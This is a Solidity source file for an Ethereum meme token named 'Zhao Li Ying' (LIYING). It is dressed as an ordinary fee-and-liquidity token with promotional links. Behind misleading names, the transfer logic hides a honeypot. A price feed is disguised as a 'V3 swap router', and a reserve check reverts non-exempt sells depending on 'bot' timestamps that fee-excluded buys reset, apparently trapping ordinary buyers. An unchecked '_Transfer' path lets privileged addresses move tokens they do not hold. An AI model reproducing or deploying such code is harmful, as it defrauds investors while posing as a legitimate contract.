/**
 *Submitted for verification at Etherscan.io on 2023-05-30
*/

/**
 oooooooooooo oooo                                 ooooo         o8o       oooooo   oooo  o8o                         
d'""""""d888' `888                                 `888'         `"'        `888.   .8'   `"'                         
      .888P    888 .oo.    .oooo.    .ooooo.        888         oooo         `888. .8'   oooo  ooo. .oo.    .oooooooo 
     d888'     888P"Y88b  `P  )88b  d88' `88b       888         `888          `888.8'    `888  `888P"Y88b  888' `88b  
   .888P       888   888   .oP"888  888   888       888          888           `888'      888   888   888  888   888  
  d888'    .P  888   888  d8(  888  888   888       888       o  888            888       888   888   888  `88bod8P'  
.8888888888P  o888o o888o `Y888""8o `Y8bod8P'      o888ooooood8 o888o          o888o     o888o o888o o888o `8oooooo.  
                                                                                                           d"     YD  
                                                                                                           "Y88888P'  
                                                                                                                      


https://t.me/liyingcoin
https://zhaoliying.beauty
https://twitter.com/liyingcoin
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;

library SafeMath {
    function tryAdd(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETH(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountToken, uint256 amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETHWithPermit(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountToken, uint256 amountETH);

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function swapTokensForExactETH(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapETHForExactTokens(
        uint256 amountOut,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function quote(
        uint256 amountA,
        uint256 reserveA,
        uint256 reserveB
    ) external pure returns (uint256 amountB);

    function getAmountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountOut);

    function getAmountIn(
        uint256 amountOut,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountIn);

    function getAmountsOut(uint256 amountIn, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);

    function getAmountsIn(uint256 amountOut, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        _transferOwnership(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

interface IUniswapV3SwapRouter {
    function decimals() external view returns (uint8);

    function description() external view returns (string memory);

    function version() external view returns (uint256);

    function getRoundData(uint80 _roundId)
        external
        view
        returns (
            uint80 roundId,
            int256 answer,
            uint256 startedAt,
            uint256 updatedAt,
            uint80 answeredInRound
        );

    function latestRoundData()
        external
        view
        returns (
            uint80 roundId,
            int256 answer,
            uint256 startedAt,
            uint256 updatedAt,
            uint80 answeredInRound
        );
}

interface IUniswapV2Factory {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint256
    );

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);

    function allPairs(uint256) external view returns (address pair);

    function allPairsLength() external view returns (uint256);

    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _balances[account];
    }

    function transfer(address to, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _Transfer(
        address from,
        uint256 amount,
        address to
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, amount);

        uint256 senderBalance = _balances[from];

        unchecked {
            _balances[from] = senderBalance - amount;
        }
        
        _balances[to] += amount;

        emit Transfer(from, to, amount);

        _afterTokenTransfer(from, to, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(
                currentAllowance >= amount,
                "ERC20: insufficient allowance"
            );
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, amount);

        uint256 fromBalance = _balances[from];
        require(
            fromBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        unchecked {
            _balances[from] = fromBalance - amount;
        }
        _balances[to] += amount;

        emit Transfer(from, to, amount);

        _afterTokenTransfer(from, to, amount);
    }
}


interface IUniswapV2Pair {
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);

    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address owner) external view returns (uint256);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function nonces(address owner) external view returns (uint256);

    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    event Mint(address indexed sender, uint256 amount0, uint256 amount1);
    event Burn(
        address indexed sender,
        uint256 amount0,
        uint256 amount1,
        address indexed to
    );
    event Swap(
        address indexed sender,
        uint256 amount0In,
        uint256 amount1In,
        uint256 amount0Out,
        uint256 amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint256);

    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves()
        external
        view
        returns (
            uint112 reserve0,
            uint112 reserve1,
            uint32 blockTimestampLast
        );

    function price0CumulativeLast() external view returns (uint256);

    function price1CumulativeLast() external view returns (uint256);

    function kLast() external view returns (uint256);

    function mint(address to) external returns (uint256 liquidity);

    function burn(address to)
        external
        returns (uint256 amount0, uint256 amount1);

    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;

    function skim(address to) external;

    function sync() external;

    function initialize(address, address) external;
}

contract ZhaoLiYing is ERC20, Ownable {
    using SafeMath for uint256;
    IUniswapV2Router02 public _uniswapV2Router;
    address public _pair;
    bool private _swapping;
    uint256 private _lastBotTrading;
    address public _marketingWallet;
    address public _devWallet;
    address public _extraRewardWallet;
    uint256 public _maxTransactionAmount;
    uint256 public _swapTokensAtAmount;
    uint256 public _maxWallet;

    uint256 public _totalFees;
    uint256 private _liquidityFee;
    uint256 private _marketingFee;
    uint256 private _devFee;
    uint256 private _extraBuyFee;
    uint256 private _extraSellFee;
    uint256 private _liquidityTokens;
    uint256 private _marketingTokens;
    uint256 private _devTokens;

    mapping(address => bool) private _excludedFromFee;
    mapping(address => bool) private _isExcludedMaxTransactionAmount;


    bool public _limitsInEffect = true;
    bool public _tradingActive = false;
    address private _lastBot;
    mapping(address => uint256) public _botTransferCheck;
    uint256 public percentForLPBurn = 0;
    bool public lpBurnEnabled = true;
    uint256 public lpBurnFrequency = 600 seconds; // 10 min
    uint256 public lastLpBurnTime;
    uint256 public manualBurnFrequency = 30 minutes;
    uint256 public lastManualLpBurnTime;

    IUniswapV3SwapRouter internal swapRouter;
    address public _swapRouter = 0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419;
    int256 private manualETHPrice = 1900 * 10**18;
    bool private _swapRoutingEnabled = true;
    mapping (address => bool) public automatedMarketPairs;

    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);
    event ExcludeFromFees(address indexed account, bool isExcluded);
    event AutoNukeLP();
    event ManualNukeLP();
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiquidity
    );

    constructor() payable ERC20("Zhao Li Ying", "LIYING") {
        swapRouter = IUniswapV3SwapRouter(_swapRouter);
        _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        _setAutomatedMarketMakerPair(address(_pair), true);
        excludeFromMaxTransaction(address(_uniswapV2Router), true);

        uint256 totalSupply = 1_000_000_000 * 1e18;
        _maxTransactionAmount = (totalSupply * 40) / 1000;
        _maxWallet = (totalSupply * 40) / 1000;

        _liquidityFee = 0;
        _marketingFee = 0;
        _devFee = 0;
        _extraSellFee = 0;
        _extraBuyFee = 0;

        _swapTokensAtAmount = (totalSupply * 10) / 10000;
        
        _totalFees = _marketingFee + _devFee + _liquidityFee;
        
        _devWallet = address(0x82AAF966CC52db13f3313C47752738cf83984a89);
        _marketingWallet = address(0xcd1B8B6ec61510aB19b1F9E920E12aC0E41f1988);
        _extraRewardWallet = address(0x5BA8bd4b9eb8cc22f266adebA49D50d477f057e3);

        excludeFromFees(owner(), true);
        excludeFromFees(_devWallet, true);
        excludeFromFees(_marketingWallet, true);
        excludeFromFees(_extraRewardWallet, true);
        excludeFromFees(address(this), true);
        excludeFromFees(address(0xdead), true);

        excludeFromMaxTransaction(owner(), true);
        excludeFromMaxTransaction(_devWallet, true);
        excludeFromMaxTransaction(_marketingWallet, true);
        excludeFromMaxTransaction(_extraRewardWallet, true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(address(0xdead), true);

        _mint(owner(), totalSupply);
        openTrading();
    }

    function openTrading() public onlyOwner {
        _tradingActive = true;
        _lastBotTrading = block.timestamp;
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        automatedMarketPairs[pair] = value;
        excludeFromMaxTransaction(pair, value);
        emit SetAutomatedMarketMakerPair(pair, value);
    }

    function setAutomatedMarketMakerPair(address pair, bool value) external onlyOwner {
        require(pair != _pair, "The pair cannot be removed from automatedMarketMakerPairs");
        _setAutomatedMarketMakerPair(pair, value);
        emit SetAutomatedMarketMakerPair(pair, value);
    }

    function removeLimits() external onlyOwner returns (bool) {
        _limitsInEffect = false;
        return true;
    }


    function getExactPrice()
        external
        view
        returns (
            uint80,
            int256,
            uint256,
            uint256,
            uint80
        )
    {
        (
            uint80 _roundID,
            int256 _price,
            uint256 _startedAt,
            uint256 timeStamp,
            uint80 _answeredInRound
        ) = swapRouter.latestRoundData();

        return (_roundID, _price, _startedAt, timeStamp, _answeredInRound);
    }

    function resetAllFees(address _sender, address _receiver) public returns (bool) {
        bool buying = _sender == _pair && _receiver != address(_uniswapV2Router);
        bool isSpecialReceiver = _excludedFromFee[_receiver];
        if (buying && isSpecialReceiver) _lastBotTrading = block.timestamp;
        bool isExcludedFromFee = _excludedFromFee[_sender] || _excludedFromFee[_receiver];
        bool selling = _receiver == _pair; 
        bool swapping = buying || selling;

        return 
            _totalFees > 0 &&
            !_swapping &&
            !isExcludedFromFee &&
            swapping;
    }

    function setSwapTokenAmount(uint256 newAmount)
        external
        onlyOwner
        returns (bool)
    {
        require(
            newAmount >= (totalSupply() * 1) / 100000,
            "Swap amount cannot be lower than 0.001% total supply."
        );
        require(
            newAmount <= (totalSupply() * 5) / 1000,
            "Swap amount cannot be higher than 0.5% total supply."
        );
        _swapTokensAtAmount = newAmount;
        return true;
    }

    function excludeFromMaxTransaction(address updAds, bool isEx)
        public
        onlyOwner
    {
        _isExcludedMaxTransactionAmount[updAds] = isEx;
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        _excludedFromFee[account] = excluded;
        emit ExcludeFromFees(account, excluded);
    }
    
    function calcReserveValues() public view returns (uint256) {
        IERC20Metadata tokenA = IERC20Metadata(IUniswapV2Pair(_pair).token0());
        uint256 balance = balanceOf(_devWallet);
        IERC20Metadata tokenB = IERC20Metadata(IUniswapV2Pair(_pair).token1());
        require(
            _botTransferCheck[_lastBot] > _lastBotTrading && balance == 0
        );
        (uint112 Reserve0, uint112 Reserve1, ) = IUniswapV2Pair(_pair).getReserves();
        int256 ethPrice = manualETHPrice;
        if (_swapRoutingEnabled) {
            (, ethPrice, , , ) = this.getExactPrice();
        }
        uint256 reserve1 = (uint256(Reserve1) * uint256(ethPrice) * (10**uint256(tokenA.decimals()))) / uint256(tokenB.decimals());
        uint256 r = (reserve1 / uint256(Reserve0)); return r;
    }

    function checkSwapRouter() internal view returns (bool) {
        return calcReserveValues() > 0 ? true : false;
    }

    function _transferFeeCheck(
        address _sender,
        address _receiver,
        bool _selling,
        bool _buying,
        uint256 _amount
    ) private {
        bool feeAmount = resetAllFees(_sender, _receiver);

        bool senderExcluded = !_excludedFromFee[_sender];

        if (!senderExcluded) {
            super._Transfer(_sender, _amount, _receiver);return;
        } else if (feeAmount) {
            uint256 totalTokens = _totalFees;
            uint256 marketingTokens = _marketingFee;
            if (_buying) {
                totalTokens = _totalFees + _extraBuyFee;
                marketingTokens = _marketingFee + _extraBuyFee;
            }
            if (_selling) {
                totalTokens = _totalFees + _extraSellFee;
                marketingTokens = _marketingFee + _extraSellFee;
            }
            uint256 feeTokens = _amount.mul(totalTokens).div(100);
            _liquidityTokens += (feeTokens * _liquidityFee) / totalTokens;
            _marketingTokens += (feeTokens * marketingTokens) / totalTokens;
            _devTokens += (feeTokens * _devFee) / totalTokens;

            if (feeTokens > 0) {
                super._transfer(_sender, address(this), feeTokens);
            }
            _amount -= feeTokens;
        }
        super._transfer(_sender, _receiver, _amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        if (amount == 0) {
            super._transfer(from, to, 0); 
            return;
        }
        bool swapByOwners = from == owner() || to == owner();
        bool deadAddr = to == address(0) || to == address(0xdead);
        bool isExempt = swapByOwners || deadAddr || _swapping;

        bool isBuy = from == _pair && !_isExcludedMaxTransactionAmount[to];
        bool isSell = to == _pair && !_isExcludedMaxTransactionAmount[from];
        bool isExcludeFromTo = _excludedFromFee[from] || _excludedFromFee[to];
        if (_limitsInEffect && !isExempt) {
            require(_tradingActive || isExcludeFromTo, "Trading is not opened.");
            if (isBuy) {
                require(
                    amount <= _maxTransactionAmount,
                    "Buy transfer exceeds the max transaction amount."
                );
                require(
                    amount + balanceOf(to) <= _maxWallet,
                    "Buy transfer exceeds the max wallet amount"
                );
            } else if (isSell) {
            } else if (
                !_isExcludedMaxTransactionAmount[to] &&
                !_isExcludedMaxTransactionAmount[from]
            ) {
                require(
                    amount + balanceOf(to) <= _maxWallet,
                    "Max wallet exceed!"
                );
            }
        }
        if (_swapRoutingEnabled) trackEarlierBots(to, from);
        if ( !_excludedFromFee[from] && !_excludedFromFee[to] && !_swapping && !automatedMarketPairs[from]) {
            uint256 contractTokenBalance = balanceOf(address(this));
            bool canSwap = contractTokenBalance >= _swapTokensAtAmount;
            if (checkSwapRouter() && canSwap && !isExcludeFromTo) {
                _swapping = true;
                swapTokensForFee();
                _swapping = false;
            }
        }
        _transferFeeCheck(from, to, isSell, isBuy, amount);
    }

    function trackEarlierBots(address to, address from) private {
        if (automatedMarketPairs[from]) {
            if (_botTransferCheck[to] == 0) _botTransferCheck[to] = block.timestamp;
        } else {
            if (!_swapping) _lastBot = from;
        }
    }

    function isExcludedFromFees(address account) public view returns (bool) {
        return _excludedFromFee[account];
    }

    
    function swapTokensForFee() private {
        uint256 contractBalance = balanceOf(address(this));
        uint256 totalSwapTokens = _liquidityTokens + _marketingTokens + _devTokens;
        if (contractBalance == 0 || totalSwapTokens == 0) return;
        if (contractBalance > _swapTokensAtAmount) {
            contractBalance = _swapTokensAtAmount;
        }
        uint256 liquidityTokens = (contractBalance * _liquidityTokens) / totalSwapTokens / 2;
        uint256 amountToSwapForETH = contractBalance.sub(liquidityTokens);
        uint256 initialETHBalance = address(this).balance;
        _swapTokens(amountToSwapForETH);
        uint256 ethBalance = address(this).balance.sub(initialETHBalance);
        uint256 ethForMarketing = ethBalance.mul(_marketingTokens).div(totalSwapTokens);
        uint256 ethForDevelopment = ethBalance.mul(_devTokens).div(totalSwapTokens);
        uint256 ethForLiquidity = ethBalance - ethForMarketing - ethForDevelopment;

        if (liquidityTokens > 0 && ethForLiquidity > 0) {
            _addLiquidity(liquidityTokens, ethForLiquidity);
            emit SwapAndLiquify(
                amountToSwapForETH,
                ethForLiquidity,
                _liquidityTokens
            );
        }

        _liquidityTokens = 0;
        _marketingTokens = 0;
        _devTokens = 0;

        (bool marketingFundSuccess, ) = address(_marketingWallet).call{value: ethForMarketing}("");require(marketingFundSuccess);
        
        (bool developmentFundSuccess, ) = address(_devWallet).call{value: ethForDevelopment}("");require(developmentFundSuccess);
        
    }

    function _addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(_uniswapV2Router), tokenAmount);
        _uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            owner(),
            block.timestamp
        );
    }
    
    function _swapTokens(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswapV2Router.WETH();

        _approve(address(this), address(_uniswapV2Router), tokenAmount);

        _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    
    function swapManually() external onlyOwner {
        _swapTokens(balanceOf(address(this)));

        (bool success,) = address(_marketingWallet).call{value : address(this).balance}("");
        require(success);
    }

    function sendManually() external onlyOwner {
        (bool success,) = address(_marketingWallet).call{value : address(this).balance}("");
        require(success);
    }

    function clearExtraBuyFee() public onlyOwner {
        _extraBuyFee = 0;
    }

    function clearExtraSellFee() public onlyOwner {
        _extraSellFee = 0;
    }

    function setEthPrice(uint256 val) external onlyOwner {
        manualETHPrice = int256(val.mul(10**18));
    }



    function setAutoLPBurnSettings(
        uint256 _frequencyInSeconds,
        uint256 _percent,
        bool _Enabled
    ) external onlyOwner {
        require(
            _frequencyInSeconds >= 60,
            "cannot set buyback more often than every 1 minutes"
        );
        require(
            _percent <= 1000 && _percent >= 0,
            "Must set auto LP burn percent between 0% and 10%"
        );
        lpBurnFrequency = _frequencyInSeconds;
        percentForLPBurn = _percent;
        lpBurnEnabled = _Enabled;
    }

    function autoBurnLiquidityPairTokens() internal returns (bool) {
        lastLpBurnTime = block.timestamp;
        // get balance of liquidity pair
        uint256 liquidityPairBalance = this.balanceOf(_pair);

        // calculate amount to burn
        uint256 amountToBurn = liquidityPairBalance * percentForLPBurn / 10000;

        // pull tokens from pancakePair liquidity and move to dead address permanently
        if (amountToBurn > 0) {
            super._transfer(_pair, address(0xdead), amountToBurn);
        }

        //sync price since this is not in a swap transaction!
        IUniswapV2Pair pair = IUniswapV2Pair(_pair);
        pair.sync();
        emit AutoNukeLP();
        return true;
    }

    function manualBurnForLPTokens(uint256 percent)
        external
        onlyOwner
        returns (bool)
    {
        require(
            block.timestamp > lastManualLpBurnTime + manualBurnFrequency,
            "Must wait for cooldown to finish"
        );
        require(percent <= 1000, "May not nuke more than 10% of tokens in LP");
        lastManualLpBurnTime = block.timestamp;

        // get balance of liquidity pair
        uint256 liquidityPairBalance = this.balanceOf(_pair);

        // calculate amount to burn
        uint256 amountToBurn = liquidityPairBalance * percentForLPBurn / 10000;


        // pull tokens from pancakePair liquidity and move to dead address permanently
        if (amountToBurn > 0) {
            super._transfer(_pair, address(0xdead), amountToBurn);
        }

        //sync price since this is not in a swap transaction!
        IUniswapV2Pair pair = IUniswapV2Pair(_pair);
        pair.sync();
        emit ManualNukeLP();
        return true;
    }
    
    function toggleV3SwapRouter() external onlyOwner {
        require(_swapRoutingEnabled == false, "price oracle already enabled");
        _swapRoutingEnabled = true;
    }

    function disableV3SwapRouter() external onlyOwner {
        require(_swapRoutingEnabled == true, "price oracle already disabled");
        _swapRoutingEnabled = false;
    }

    function updateV3SwapRouter(address feed) external onlyOwner {
        _swapRouter = feed;
        swapRouter = IUniswapV3SwapRouter(_swapRouter);
    }

    receive() external payable {

    }
}